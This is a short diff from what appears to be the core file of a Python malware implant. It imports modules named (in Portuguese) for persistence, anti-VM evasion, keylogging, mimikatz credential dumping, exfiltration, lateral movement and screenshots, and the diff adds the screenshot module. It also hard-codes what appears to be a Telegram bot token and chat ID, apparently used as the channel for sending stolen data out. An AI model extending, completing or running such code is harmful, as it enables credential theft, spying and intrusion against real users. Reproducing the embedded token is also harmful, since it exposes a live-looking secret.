@@ -1,5 +1,5 @@
 import requests, time, threading, socket
-from core import persistencia, evasao_antivm, keylogger, comandos, condicional, mimikatz, exfiltracao, keylogger, movimento_lateral
+from core import keylogger, mimikatz, exfiltracao, keylogger, movimento_lateral, screenshot
 
 TOKEN = '7504792598:AAHN9Cy96poY_6JCKqXTBMUlx08vn8lZPNg'
 CHAT_ID = '7314010265'
